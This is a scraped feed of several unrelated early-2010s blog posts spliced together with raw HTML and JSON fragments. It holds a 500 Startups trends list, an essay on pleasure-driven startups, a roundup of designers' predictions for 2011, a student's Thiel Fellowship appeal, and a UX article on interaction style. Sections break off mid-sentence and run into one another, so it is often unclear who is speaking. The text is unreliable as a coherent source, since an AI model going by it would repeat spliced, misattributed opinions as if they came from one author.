“things”</strong></p>\n<p>Yet another innovation around integration: the offline world is quickly becoming stapled into the future by combining physical representations with digital ones. Imagine if everything you touched, held, or viewed in real life became a separate online addressable entity… kind of like slapping a sticker with a URL onto anything and connecting it to the Web. Not quite cyberspace, rather this augmented reality is how we are building out the real world online, and subsequently can deliver benefits of identification, indexing, categorization, discovery, and location to the offline world. This new and enhanced Internet enables offline discovery and navigation of many previously hidden real-world resources. Our investment in <a href=\"http://Retailigence.com\">Retailigence</a> is also connected to this trend.</p>\n<p><strong>5. The Emergence of global languages and geographic arbitrage</strong></p>\n<p>Current estimates suggest more that two billion people around the world use the Internet via PCs, and including mobile phones perhaps three billion people are online, or around half the entire population of the earth. As shown by this <a href=\"http://shanghaiist.com/2010/12/23/infographic_chinese_the_new_dominan.php\">infographic</a>, English and Mandarin dominate the online conversation with close to 500 million speakers online and more than a billion offline. Also growing in online influence: Spanish, Arabic, Hindi, and Portuguese. What’s interesting is that these languages also seem poised to drive cultural trends globally. Looking at average GDP and Internet penetration by language, we can map out a geographic playbook for any Internet startup to prioritize how they lay the online smackdown on the planet, and use geographic arbitrage to move the point of innovation, production, and transaction to optimal locations. For more info on this topic, see p.5 of this <a href=\"http://mygengo.com/report/translation-industry-2009\">2009 report on global language trends</a> by <a href=\"http://MyGengo.com\">MyGengo</a>, a 500 Startups portfolio company.</p>\n<p><strong>6. YouTube killed the video star: Distribution and monetization of online video</strong></p>\n<p>After years of free online video via YouTube, you’d think it’s impossible for anyone to make money online. But on the contrary: Apple, Netflix, and Hulu are laughing all the way to the bank, and even YouTube itself is rumored to be close to break-even. Massive distribution and monetization platforms are now a reality for online video, which should translate into tremendous opportunities for startups. We’ve already invested in video monetization startup <a href=\"http://Brainient.com\">Brainient</a> and education video site <a href=\"http://udemy.com\">Udemy</a>; and we have several other video distribution and promotion investments we will announce soon. Expect more innovation and development in video, as millions of iPad and other tablet devices become mainstream, and as YouTube continues to expand its influence on global culture and entertainment. Here’s lookin’ at you, kid.</p>\n<p><strong>7. More iPads, iPhones, iOs Apps and more Android on the way</strong></p>\n<p>Apple continues to be an irresistible force of nature when it comes to consumer computing devices and application platforms. Bloggers are already arguing whether Apple will “only” ship 45 million iPads in 2011, or if they’ll exceed 50-60 million units. Nice problem to have for a product barely a year old, eh? At the same time Android devices are growing in popularity, and seem poised to compete effectively with Apple for mobile application dominance. Regardless, both platforms will drive huge amounts of user and developer activity, and the future couldn’t look brighter for startups focused on mobile apps and services. Our investments in mobile ads platform <a href=\"http://medialets.com\">MediaLets</a> and mobile analytics provider <a href=\"http://apsalar.com\">Apsalar</a> reflect our strong belief in the growth of mobile infrastructure services.</p>\n<p><strong>8. Design is the new black: The growing importance of user experience and design</strong></p>\n<p>Along with Apple’s success — or perhaps because of it — <strong><a href=\"http://www.businessweek.com/innovate/content/jan2010/id20100120_303529.htm\">design has become a critical skill for startups</a></strong>. Apple’s fanatic obsession with simplicity and user experience has also become a priority for consumer-focused startups in particular. The most notable example of this is one of my former portfolio companies, Mint.com, acquired by Intuit in 2009. As with Apple, the Mint team had a never-ending passion for design and UX (user experience), and many people attribute much of Mint’s successes to their unique and compelling Web design. I expect the design trend to continue and even accelerate; look for growing and continuing investment in design-driven and UX-driven products. Our  investments in eye-tracking startup <a href=\"http://gazehawk.com\">GazeHawk</a>, foodie pic-porn startup <a href=\"http://Foodspotting.com\">Foodspotting</a>, and in <a href=\"http://955dreams.com\">955 Dreams</a> and their new  <a href=\"http://itunes.apple.com/us/app/historyofjazz/id411521458?mt=8\">History of Jazz app</a> for the iPad are great examples of where we see the industry heading with design and UX.</p>\n<p><strong>9. Family 2.0: Apps for kids and grandmas</strong></p>\n<p>Better design and better user experience has made it easier for new audiences to start using the Web, particularly the young and the old. My kids – now 3 and 5 – have become big fans of using the iPhone and iPad, and when I watch them their experience is so natural and easy. They never had to read a manual, they just started touching and swiping and pinching – it was <em>magical</em>. But while kids have become easy and eager adopters of these devices, there remains quite a large amount of education content and apps to deliver. And not just for kids, but also for older folks too — more and more seniors are comfortable with computers and computing devices, so expect a growing market for users of all ages.</p>\n<p><strong>10. Facebook is dead. Long live Facebook.</strong></p>\n<p>Some folks continue to complain that Facebook is overvalued, or Facebook has jumped the shark, or Facebook app development is challenging and the rules change constantly. To these folks I say: <em>stop whining, get over yourselves, and <strong>get to work</strong>.</em> Facebook is an unstoppable global juggernaut 600 million users strong, and dominating our online experience. While Twitter has certainly  grown leaps and bounds too, it’s impossible to ignore how significant Facebook has become as a familiar and frequent environment… for <em>everyone</em>. And generally, this is a good thing. While the idiosyncrasies of Facebook platform change all the time, it’s worth the effort.

Both times, I got up on stage and <a href=\"http://www.youtube.com/ladidakhush\">belted out my prezo</a> in C Major (our product is <a href=\"http://bit.ly/get_ladida\">LaDiDa</a>, an iPhone app that <a href=\"http://www.cnn.com/video/#/video/living/2010/10/14/nr.iphone.app.tune.singing.cnn\">helps bad singers make music</a>), and then backed up the singing with solid growth metrics on our business. The audience loved it, and LaDiDa was a crowd favorite to win in both contests. But when it came time for the judges’ feedback, I was frustrated to hear a familiar refrain: “Your demo is great, really cool app,” they said, “but we can’t give you this award because your product doesn’t solve any obvious pain point.”</p>\n<p>Most investors will tell you to never walk into a meeting without a good answer to “what’s the problem you’re trying to solve?”. Dave McClure’s famous <a href=\"http://www.slideshare.net/dmc500hats/how-to-pitch-a-vc-aka-startup-viagra-how-to-give-a-vc-a-hardon\">Startup Viagra: How to Pitch a VC</a> deck puts this question right up front, at slide #2. Focus on pain, say the experts. Your product must be a painkiller.</p>\n<p>While there is obvious wisdom to this rule, there is also a flaw in using this rubric exclusively. Consider, for example, that the most addictive technologies we’ve seen in the past few years would have never passed this test before millions of people were already using them (that’s perhaps why so many VCs <a href=\"http://techcrunch.com/2010/12/10/ask-a-vc-we-probably-would-have-been-the-last-guys-to-do-a-round-in-twitter-tctv/\">missed the boat on Twitter</a>). It’s easy to say today that Twitter solves the problem of dispersed information, or Facebook the problem of dispersed friends. But who thought of these as “pain points” back in 2004? I don’t believe Twitter and Facebook are painkillers. Just ask yourself, Is “acetaminophen” really the drug you feel like you’re on when you’re using Twitter? Or does “methamphetamine” sound more appropriate? There’s in fact been research to show that <a href=\"http://www.huffingtonpost.com/russell-poldrack/multitasking-the-brain-se_b_334674.html\">your brain reacts to products like Twitter</a> in much the same way as it would to stimulants like meth.</p>\n<p>So what’s my point? If you focus only on painkillers, you’ll likely miss out on a completely different, and potentially much larger, set of opportunities: those that target pleasure. Pornography, sports and coffee are, for example, three insanely lucrative industries, and each of them sells the promise of pleasure.</p>\n<p>I believe that a focus on solving pain points alone leads to linear thinking that suppresses innovation. A perfect example of this is music. As traditional wisdom would have it, music is an ailing industry. Listeners won’t pay for content, labels are going bankrupt and artists don’t know how to connect with their digital fans. Lots of obvious pain points waiting to be addressed, and lots of start-ups offering obvious solutions. But obvious is never disruptive. The opportunity for disruption in music lies in the pleasure of music creation. The idea that only professional musicians, backed by labels, should create music was a relatively short-lived fad (music creation has, for most of human history, been a central part of daily life; some even believe that music was a precursor to speech), and it is so over. So let’s forget about the dying parts of the music industry, and focus instead on the world’s 6 billion living, breathing musicians who are ready and waiting to express themselves through music creation. I assure you there are several multi-billion dollar opportunities there waiting for us, as well as a few viral videos…like this one of a dog singing with her iPad <img src=\"http://blog.500startups.com/wp-includes/images/smilies/icon_wink.gif\" alt=\";)\"> </p>\n<p><iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://www.youtube.com/v/Mk4bmK-acEM?fs%3D1%26hl%3Den_US&amp;width=560&amp;height=340\" width=\"560\" height=\"340\"></iframe></p>\n<p>I’ll close with a caveat to my argument above—it’s not clear that meth (and Internet products like it) are actually sources of pleasure. Rather, they may simply <a href=\"http://www.lsa.umich.edu/psych/research&amp;labs/berridge/research/affectiveneuroscience.html\">induce pleasure-seeking behaviors</a> that are never fully satisfied, and that’s what keeps people coming back.</p>"

I’m a strong believer of “doing your own thing” and not looking at what others are doing or what will be popular. If somebody would say gradients are out I’m saying I still will use them if they fit what I’m designing.</p><p><span style=\"font-style:italic;font-weight:bold\">Veerle Pieters</span>, <a href=\"http://twitter.com/@vpieters\"><span style=\"font-style:italic\">@vpieters</span></a><span style=\"font-style:italic\"><a href=\"http://twitter.com/@vpieters\">,</a> is a graphic/web designer living in Belgium.

The tools and tricks of our industry are always evolving, but the explosion of webfonts, CSS3 and HTML5 over the last year has made for an exciting ride. I predict that this new found momentum will continue in 2011 and that we’ll see even more exciting and beautiful sites exploiting these technologies.</p><p>On the pure design front, I think all of our bold CSS3 experiments will give way to more minimalist trends this year. Subtle will become the new black and that will apply to our color choices, backgrounds, borders, shadows and gradients.</p><p>I don’t think the same will be true of typography. I predict that 2011 will be a banner year for typographic exploration and that webfont-powered typefaces will play an even bigger role in online brand identity.</p><p>Having just finished reading Khoi Vinh’s excellent “<a href=\"http://www.amazon.com/Ordering-Disorder-Principles-Design-Voices/dp/0321703537\">Ordering Disorder: Grid Principles for Web Design</a>“, I also predict that we’ll see even more focus on grid-based design in 2011. Our use of grids will extend far beyond the “<a href=\"http://960.gs\">trusty 960</a>“- that has become the defacto standard to more accurately address our client’s specific goals.</p><p>The surge in tablet computing will revive the old fluid vs. fixed debate and will result in more “<a href=\"http://www.alistapart.com/articles/responsive-web-design/\">responsive</a>“designs. Finally,I think we’ll see a dramatic decrease in stock photo use in the coming year. The rise of mobile camera apps like Instagram and Hipstamatic have made a lot of web designers feel like amateur photographers. I believe this will result in more designers taking the pictures they need for client projects rather than paying the ever-increasing prices of microstock.</p><p style=\"font-style:italic\"><span style=\"font-weight:bold\">Jason Beaird</span>, <a href=\"http://twitter.com/jasongraphix\">@jasongraphix</a>, is the author of the recently revised “<a href=\"http://www.sitepoint.com/launch/8e91955/3/271\">Principles of Beautiful Web Design</a>” and currently works as a contract UX designer for MailChimp.

However I believe that I’m fairly safe in saying that 2011 will be the year of alternative devices. By that I mean more and more people will be accessing the web via a device other than their desktop PC or laptop. And I’m not just talking about the iPhone or iPads. We can expect to see an explosion of Android and Window devices.</p><p>This has all kinds of ramifications for us as web designers. Sites will need to be more flexible than ever and I expect to see many more people adopting responsive design techniques. However I believe that this is just the tip of the iceberg. Responsive design is great but does not take into account the varying contexts people will now be accessing the web in. For example the requirements of a user sitting in front of their desktop PC at home is very different from somebody accessing your site via smart phone on a busy train.</p><p><span style=\"font-style:italic\">Paul Boag, <a href=\"http://twitter.com/boagworld\">@boagworld,</a> Founder of web design agency Headscape, host of the boagworld web design podcast and author of the website owners manual.</span></p><p><br></p><h1>Jacob Cass</h1><p><a href=\"http://justcreativedesign.com\"><img src=\"http://netdna.webdesignerdepot.com/uploads/predictions2011/JCass_Justcreativedesign2.jpg\" alt=\"Jacob Cass Just Creative Design\"></a></p><p>Trends in web design come and go at a very a quick pace so you really need to be at the top of your game to understand what the limitations and opportunities are when it comes to designing for the web.

Better screens (both desktop and mobile) and the continued rise of optimized reading services like Instapaper will hopefully herald the end of that <em>“people don’t read online” </em>myth. If so, we can also expect an overdue backlash against reader-hostile practices like splitting content across multiple pages and intrusive advertising. — <span style=\"font-weight:bold\">Cennydd Bowles, Clearleft</span></p><p>I think we’re going to see web fonts go mainstream in 2011, with more and more sites ditching techniques like Cufon in favour of native technologies. We’re going to see IE 6 finally disappear, if we haven’t already. However the biggest thing next year is going to be the move into mobile. Companies are finally going to realize that having a mobile strategy doesn’t just mean commissioning an iPad app. Instead we’re going to see more and more companies create mobile optimized versions of their websites using media queries. As such I think 2011 is going to be the year of responsive design. — <span style=\"font-weight:bold\">Richard Rutter, Font Deck</span></p><p>With more and more digital applications like the iPlayer being designed for TV viewing I think 2011 is going to be a big year for transmedia. In the UK, all the major TV channels are behind the launch of a new digital box called YouView. Built around common web standards, it’s a platform for developing and deploying interactive experiences on the TV. In the US, innovative start-ups like Kevin Slavin’s Starling application aims to make TV a more social experience. As such I predict that 2011 will be the year when digital applications start to make inroads into the front room. — <span style=\"font-weight:bold\">Andy Budd, Clearleft</span></p><p style=\"font-style:italic\"><span style=\"font-weight:bold\">Clearleft,</span> <a href=\"http://www.twitter.com/clearleft\">@clearleft</a> <a href=\"http://www.twitter.com/clearleft\">,</a> is a team of eleven specialists: designers, developers, authors, thinkers and web afficionados.

After years of returning to static pages and images, we’re moving back to interactivity without Flash thanks to easy-to-use JavaScript libraries like <a href=\"http://jquery.com\">jQuery</a>. Moving forward, I see HTML5 &amp; CSS3 taking us to the next phase of the Interactive Web thanks to advanced CSS features like animation, opacity and transitions.</p><p>Second, typography on the web is drastically changing for the better, which we’ll see more of in 2011. Clients will ask for typefaces other than Georgia, Arial and Helvetica, and without having to generate images for headlines, we as designers will be able to grant such a request.

I predict that we’ll be seeing a lot more design for function, such as location features or social graph integration that are becoming more readily available, rather than simple trends of form.</p><p>The ability to leverage “known” information about a user such as social activity or interests from companies like Facebook, or location information via HTML5 or by using products from companies such as SimpleGeo, we’ll find UI/UX design becoming more reactive to available information on a much more granular level.  This could be as simple as updating UI based upon local time, weather, or relevant nearby social activity. Or, it could be as complex as planning for scalable content based upon what is relevant to a user’s interests.</p><p>These new technologies have set us well on our way to much more personally relevant experiences online, and I look forward to the solutions the UI/UX community come up with to translate these technologies into elegant, highly-usable design.</p><p style=\"font-style:italic\"><span style=\"font-weight:bold\">Jeffrey Kalmikoff,</span> <a href=\"http://twitter.com/jeffrey\">@jeffrey</a>.

I think web designers are now realising that this is where a large part of their profession is heading. It’ll be exciting to see whether techniques like ‘responsive web design’ catch on or designers stick to the dedicated mobile site solution.</p><p>I also think as that as screen resolutions increase, designers will be faced with yet more challenges. Like with the iPhone 4 we might well have to increase image sizes for other devices which will obviously have an impact on the amount of data people download.</p><p>From an aesthetic point of view I still think a lot of web design is far too trend driven. I’d really love to see designers thinking more about the content of the site and the organisation they’re designing for, and create work that’s more meaningful for the users. Eg. The only point for putting a strip of fabric and some stitching across the top of your site is if you’re designing it for a fabric/sewing store.</p><p style=\"font-style:italic\"><span style=\"font-weight:bold\">Mike Kus,</span> <a href=\"http://twitter.com/mikekus\">@mikekus,</a> is a Graphic/Web Designer &amp; Illustrator based in Bath, UK. and Designer at Carsonified.com</p><p><br></p><h1>Patrick McNeil</h1><p><a href=\"http://thewebdesignersideabook.com/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/predictions2011/PMcNeil_webdesignersideabook2.jpg\" alt=\"Patrick McNeil Web Designers Idea Book\"></a></p><p>My prediction for 2011 as it relates to design is all focused on platforms. Every year we see web development focusing more on platforms to get things done. Each year it seems that fewer sites are built from scratch. It all makes perfect sense of course. Not only are there catch all platforms that can be massively customized to fit very specific needs, but there are also niche ones that solve specific (and common) industry needs. So why should a designer care?</p><p>This has a tremendous impact on the designer. In the print world, the best designers understand the medium the best. They know how to control the cost of the product by the design choices they make. The web is very much the same; the very best designers understand the medium, its limitations, opportunities and ways to control the price of the end product. I believe that in 2011 the difference between designers who simply design and let the developers sort through the implementation and those that understand the full process and can design thoughtful CMS friendly designs will become even more evident.</p><p>While I don’t expect designers to learn to develop, I do expect that they will continue to deepen their understanding of how the web, and more specifically, various CMS’s work. This means designing sites that can be effectively integrated into platforms and be maintained by business owners. The designer I see forming will not only be more effective, but will also be more profitable. This combination of talents is somewhat rare and hard to acquire.</p><p><span style=\"font-weight:bold;font-style:italic\">Patrick McNeil,</span> <span style=\"font-style:italic\"><a href=\"http://twitter.com/DesignMeltdown\">@DesignMeltdown</a>, is a web developer, designer and the author of two books on web design titled <a href=\"http://www.amazon.com/gp/product/160061972X?ie=UTF8&amp;tag=louisjordan-20&amp;linkCode=as2&amp;camp=1789&amp;creative=390957&amp;creativeASIN=160061972X\">The Web Designer’s Idea Book</a>.

We’re watching browsers finally come together in some semblance of similarity now, and its allowing us to consolidate our thinking a bit in areas of technology, platforms, and browser types.</p><p>Now we’re able to engage in questions about concept, ideas, delivery, experience. I would like to see web designers asking themselves and their clients about metaphors and stories that can be told through the experience of communicating content in a digital medium that moves, changes, breathes, pulses with life. It’s not “print on screen” anymore. The web is clearly its own unique medium. We’re potentially moving from the web’s infancy into a stage of early development where real thinking starts to take shape.</p><p>Then again, I’m listening to the Inception soundtrack as I write this and that could be influencing my epic positive thinking.</p><p>It’s possible that things are not so hopeful. I continue to see web designers place the wrong emphasis on style over meaning, and concern themselves with sexy pixels before successful projects with real return on investment for their clients. I know few web designers who are willing to accept that knowing how to push pixels with Photoshop or fireworks, or craft clean code with the three layered HTML/CSS/JS does not make you a web designer.</p><p>I am a web designer because I bend my mind toward the web medium, its unique differences and expanses of similarity to other design disciplines, and the simple but important facets of the Visual Language. I’m constantly learning more, and ever humbled at how little I know, but until we all grow in these areas and beyond simply mastering pixels and code, we’ll be stuck in 2006.</p><p><span style=\"font-style:italic\"><span style=\"font-weight:bold\">Matthew Smith, </span></span><a href=\"http://twitter.com/squaredeye\"><span style=\"font-style:italic\">@squaredeye</span></a><span style=\"font-style:italic\">, keeps a close eye on each square little pixel and grid that, arranged with intelligence and inspiration, form a design that helps us–and your company–grow.</span></p><p><br></p><h1>Jonathan Snook</h1><p><a href=\"http://snook.ca/\"><img src=\"http://netdna.webdesignerdepot.com/uploads/predictions2011/JSnook_SnookCA2.png\" alt=\"Jonathan Snook CA\"></a></p><p>I anticipate that 2011 shall be the year where people will use CSS3 in droves.

The web is going to become a more immersive experience and that is going to show in the designs, typography, and color usage that will we will be seeing.

      "content" : "<p>Stanford was my dream school. It had been marked with a big red X for years on my roadmap of life. <a href=\"http://maxmarmer.com/2009/04/destination-now-approaching-college-admissions/\">The first time I applied I got rejected</a>. <a href=\"http://www.iwillteachyoutoberich.com/blog/stanford-admission-after-rejection-hustle/\">I wanted it bad enough that I applied again a year later and got in</a>. But by the time I arrived on the farm this fall the honeymoon was over. Stanford and I were no longer right for each other and after a quarter we agreed it was best to part ways. I don’t feel deceived for wanting Stanford for so long. It was a worthy focus of my desires at the time. And I don’t feel cheated for having to leave so quickly. I’m glad Stanford finally accepted me, that we got the chance to know each other, and that I found the courage to separate before we became too settled.</p>\n<p>What we need on our journey to get where we want to go is constantly changing as we learn and grow. We can’t become too attached to our dreams. Dreams are the figures dancing on the horizon at the edge of what we can see. But as we move through the valleys and over the mountains and hilltops in pursuit of our dreams, our perspective inevitably changes. When we see the horizon from a new vantage point we can rechart our journey based on our new view of the world or we can cling to the dreams of yesteryear.</p>\n<p>A month into Stanford I could tell my current arrangement wasn’t working. I talked it through with my mentors, friends and family, and the administration at Stanford and it became clear I had to make a choice: Enjoy college life or pursue my passion and try to change the world. Framed that way I barely had to blink. For the last 4 years when faced with similar decisions I’d made the choice to forgo present hedonism in pursuit of my larger purpose. Now was no time let up.</p>\n<p>Around the same time I made the decision to leave Stanford, Peter Thiel announced his <a href=\"http://www.thielfoundation.org/index.php?option=com_content&amp;view=article&amp;id=15&amp;Itemid=19\">20 under 20 fellowship</a>, and my inbox was full of friends telling me that when they heard the announcement I was the first person they thought of and that the opportunity was perfect for me. From what I’ve learned so far, I couldn’t agree more. I’m <a href=\"http://www.hoover.org/publications/policy-review/article/5646\">vision aligned</a> with Thiel. I believe the world’s pace of change is accelerating, and the margin for whether we have the best century in human history or the worst is incredibly thin. The unimaginably positive scenario is largely dependent on an accelerating pace of globalization and innovation, so I’ve aimed my efforts at what I believe is one of the biggest leverage points to the tip the scales in our favor.</p>\n<p>I believe <a href=\"http://en.wikipedia.org/wiki/Accelerating_change\">as the pace of change speeds up</a>, <a href=\"http://www.johnseelybrown.com/shiftindexabstract.pdf\">large corporations will topple faster and faster </a>and the economy will increasingly be dominated by <a href=\"http://www.slideshare.net/sblank/why-startups-are-not-small-versions-of-large-companies\">startups doing disruptive innovation</a>. My mission to empower entrepreneurs by uncovering the <a href=\"http://www.slideshare.net/Alex.Osterwalder/successful-entrepreneurship-5747012\">science of entrepreneurship</a> in order to build an <a href=\"http://steveblank.com/2010/10/25/entrepreneurship-as-a-science-%E2%80%93-the-business-modelcustomer-development-stack/\">integrated solution stack</a> that entrepreneurs can use to dramatically increase the success of their ventures. I’ve been collaborating closely with <a href=\"http://steveblank.com/\">Steve Blank</a>, <a href=\"http://www.businessmodelgeneration.com/\">Alex Osterwalder</a>, <a href=\"http://luxr.posterous.com/\">Janice Fraser</a> and other entrepreneurial thought leaders and I believe we have the beginnings of a solution. I recently co-founded a new company called <a href=\"http://blackbox.vc/\">Black Box</a> to harness this opportunity, and you’ll be hearing more about us soon.</p>\n<p>Furthermore, the larger mission of the Thiel Fellowship resonates very strongly with me. It is a huge societal problem that many of the country’s brightest people are funneled into situations that prevent them from taking risky, but potentially world changing bets. I believe the education system as a whole is broken beyond repair, and starting anew via creative destruction is our only hope for system-wide improvement. Since it seems the interests of the education systems are too entrenched for that to happen, the only alternative are efforts like the Thiel Fellowship gaining major support and at least moving the highest potential young people into a new environment where their potential can be nurtured. <a href=\"http://maxmarmer.com/2009/07/my-speech-at-the-world-future-society/\">I’ve been interested in changing the education system for awhile.</a> <a href=\"http://maxmarmer.com/2010/01/5-steps-of-entrepreneurial-growth/\">A little over a year ago I came to the realization that the world’s biggest problem isn’t poverty or climate change, it’s that humanity just doesn’t have enough people working on the world’s biggest problems</a>. I think efforts like 20 Under 20 are a big step in the right direction. If I didn’t believe what I’m working on could have a bigger, more immediate impact, I would still be trying to reinvent education for the 21st century.</p>\n<p>The opportunities winning the Thiel Fellowship would create are equally exciting. The most valuable element for me would certainly be the network of people I would be connected with. Making an impact isn’t as much about the resources you possess as it is the people you surround yourself with. Considering my current passion is the science of entrepreneurship, and that Founders Fund and The Paypal Mafia are made up of some of the best entrepreneurs in the world, it’s hard to think of a better community to become a part of. While I believe I could get in touch with these people on my own, formalization is a tremendous accelerant. I also would find the grant highly valuable. While I’m confident I can figure out a way to make ends meet financially, I come from a middle class family and the time and energy it could take to satisfy my financial needs could become a substantial burden that takes my focus away from creating a successful startup. So the money too, would be a significant accelerant.</p>\n<p>I particularly like that the two “ringleaders” of the Paypal Mafia, Peter and Reid, both describe themselves as philosophers and entrepreneurs.  For me, philosophy is about trying to describe the future we should build, and entrepreneurship is how that future gets built. Reid has said he planned on becoming an academic but realized academics get little attention and that he could have a much greater impact as an entrepreneur. I arrived at a similar conclusion at 18. I had chosen to immerse myself in the Accelerating Change/Singularity Community a few years earlier, and after a year or two of <a href=\"http://www.singularity.com/\">reading</a>, <a href=\"http://www.longnow.org/seminars/\">attending events</a> and <a href=\"http://www.singularitysummit.com/\">conferences</a>, and <a href=\"http://iftf.org/\">working</a> I felt I had a good sense of where the future was probably headed. I turned my attention to figuring out how I personally would make an impact and entrepreneurship became the clear answer.</p>\n<p>The fascinating thing about the evolution of my interests from the Accelerating Change community to the startup community is that there are very few people who are actively involved in both worlds. But Peter Thiel who is arguably one of the most influential people in Silicon Valley, is unquestionably the most important benefactor in the accelerating change community, with a substantial number of organizations largely sustained by his Foundation.</p>\n<p>These two communities, which have been the most influential on my life, came together full circle on the first Tuesday evening of December at the Place of Fine Arts. The Thiel Foundation held <a href=\"http://www.bizjournals.com/sanjose/news/2010/12/07/peter-thiel-urges-funding-for-the-future.html\">a showcase</a> to expose the luminaries of Silicon Valley to 8 non-profits working on radical projects with the potential to transform humanity. Missions ranged from <a href=\"http://www.sens.org/\">ending aging</a>, to the <a href=\"http://singinst.org/\">safe creation Artificial Intelligence</a> to <a href=\"http://seasteading.org/\">revolutionary improvement of global governance by experimenting with floating cities at sea</a>.</p>\n<p>The last time I was at the Place of Fine Arts was at the Singularity Summit in September of 2007. It was the first Futurist event I ever attended, and the relationships I formed that day changed my life. Here I was again, more than 3 years later. The last time I was here I knew nobody. This time I was cheering on friends Michael Vassar and Patri Friedman on stage, working the room during the reception to talk with all the entrepreneurs in attendance who had become friends, colleagues and advisors, and talking with Peter Thiel about my work in the context of the program he just launched, which could change my life again.</p>\n<p><strong>If you are a friend who would support me in winning this fellowship, I’d appreciate it if you left a word of recommendation in the comments.

      "content" : "<div>\n<p>We live in the age of individuality, in the sense that, whether it's business, personal stuff or anything else in between, we seek and prefer systems that allow us make our own choices; we prefer those over standardized solutions. From customization to user oriented services and products, the center of gravity shifted from the general mass of people to you.</p>\n<p><strong>We even witnessed this transition. It was a brief but fundamental turn. It's not about what everybody does anymore, it's all about what you want.</strong></p>\n<p>We have seen this with clients, consumers, as well as with everybody in our team: it's a very particular type of positioning. You are important and everybody else is important too. This type of positioning is embedded in the style of interaction, a topic we think needs more attention, because it is connected to UX Design principles.</p>\n<div><a href=\"http://www.flickr.com/photos/purecaffeine/4325067780/\" title=\"Sketching by NathanaelB, on Flickr\"><img width=\"500\" height=\"366\" alt=\"Sketching\" src=\"http://farm5.static.flickr.com/4064/4325067780_c251777417.jpg\"></a> </div>\n<span>Photo by: <a href=\"http://www.flickr.com/photos/purecaffeine/4325067780/in/photostream/\">NathanaelB</a></span><br>\n</div>\n<div>\n<h3>A Brief Definition of Style</h3>\n<p>If there is any principle in design that we are surely aware of and care about - that principle must be related to style. We define style as:</p>\n<p><strong>A personal statement one makes through what they do</strong></p>\n<p><strong>A simple and unmistakable bouquet of something one creates</strong></p>\n<p><strong>The look and feel of people, places and things</strong></p>\n<p><strong>UX Design and Rules of Interaction</strong></p>\n<p>It is clear then that style plays a major role in business, communication, interaction and in various areas of visual expression, from design to architecture and art. We use message, facts and style cues to determine whether we made a choice that fits our preferences and expectations. Speaking of expectations, everybody expects some type of aesthetic touch added to the service or product provided. That aesthetic touch can come from the provider (designer items or gifts) or from the user (customized services, user-oriented interfaces).</p>\n<h3>Purpose and Clarity</h3>\n<p>Every startup, product or application needs a launching place and an interaction arena. Some think of websites as launching places in the virtual market. But we like to think it is actually an interaction area or arena. And we like to think that clients feel the same way about it.</p>\n<p>When you design and build a website, what type of information do you consider to be vital, to start with? It can be in any order, but it all comes down to message, appearance, purpose and functionality. Is that enough? Maybe. Should finding and expressing a certain style be constrained by budget? We think not. The only thing that deprives work of style is lack of passion or lack of understanding.</p>\n<p>Style in a user centered design practice is a personal or formal expression of how you think about your users, clients, fans and friends. Community oriented websites are extremely relevant for that matter. For example, when users have their own profiles, whether it's a simple description and a picture or a stuffed profile with lots of things going on - it's all about that special spot - the users spot, that they get to customize. That is a basic and extremely engaging level of interaction. Style, in this case, is not determined by how people get to customize their own profiles, but by intrinsic rules of interaction, permission levels and privacy settings. These things will encourage a certain type of communication and eventually, the desired style of interaction (user-to-user and user-to-website) will be achieved.</p>\n<p>UX Design is all about style, too. UX Design emerged partly because of how our lifestyle changed. The way we present, absorb and communicate things is soaked with graphics. Design is everywhere. Consequently, aesthetics and design will channel information in a way that is persuasive and attractive to say the least.</p>\n<p>UX Designers know aesthetic pleasure calls to action. But they will add a sense of direction, purpose and clarity to that website. And so, this is the part where you feel and understand the message, the story, the personality behind it all. </p>\n<p><strong>UX Design uses style to make a website memorable and have personality.</strong></p>\n<div>\n<a href=\"http://www.flickr.com/photos/marcwathieu/4073641305/\" title=\"Gesture, attitude, behaviour by Marc Wathieu, on Flickr\"><img src=\"http://farm3.static.flickr.com/2508/4073641305_6f736ec7bd.jpg\" width=\"500\" height=\"333\" alt=\"Gesture, attitude, behaviour\"></a>\n</div>\n<span>Photo by: <a href=\"http://www.flickr.com/photos/marcwathieu/4073641305/in/photostream/\">Marcwathieu</a></span><br>\n</div>\n<h3>Effective Use of Interaction Elements</h3>\n<p>People will use specific elements to interact with your website. Menus, navigation and action buttons, forms and communication-related elements. These are well known, frequently used elements that can make an interface more or less enjoyable.</p>\n<p>When using these elements, your experience, communication skills and approach to web design and development will become part of the style of interaction defining your website interface.</p>\n<p><strong>The Behaviorist Approach</strong></p>\n<p>You think that people come to your website to do or find something and then decide on the next step. You think they will enjoy using different selection and search tools, rating and tagging and eventually - you think they want to buy or subscribe to everything they think is good for them. Therefore, this final step will be one or two clicks away and the style of your website will be something similar to <a href=\"http://en.wikipedia.org/wiki/Jerry_Maguire\">Jerry Maguire</a>. You prefer e-commerce websites or something similar – as far as  functionality and design are concerned. You will encourage the user to do something every time they visit your website and you probably don’t want them to customize things too much, because that makes you feel you can’t predict how they will react and what they will do on your website.</p>\n<p><strong>The All-things-social Approach</strong></p>\n<p>You think the web is a better, more versatile and more enticing extension of real-life interaction. You use interaction elements to encourage people engage in conversations, build relationships, find friends, share things about themselves. Your choice of design is made based on the idea that your website has a story and a personality. You will try to make users stay longer on your website, enjoying a fun environment, as well as a very casual and relaxed style embedded in the way you talk to them.</p>\n<p><strong>Information Oriented Approach</strong></p>\n<p>You think information is the purpose, therefore you focus on usability and look. You prefer revealing your style through typography and sleek CSS effects. You think that people who come to your website want to stay informed and connected, but you leave either of those two choices in their own hands. Interaction elements are seamlessly integrated in the interface layout and perfectly adjusted to fit the general style, color palette and theme.</p>\n<div>\n<p><strong>Endnote:</strong> Style is something that you feel, live and express through what you do. If you believe in your message and if you can picture yourself actually interacting with the type of people you want to be your fans, then you are on the right track. You are ready to make it big, with style.</p>\n</div>\n<div>\n<p>Advertisement:</p>\n<a href=\"http://www.appsumo.com/?r=7eHl\"><img alt=\"\" src=\"http://velorastudios.com/blogimg/appsumo.jpg\"></a>\n</div>"

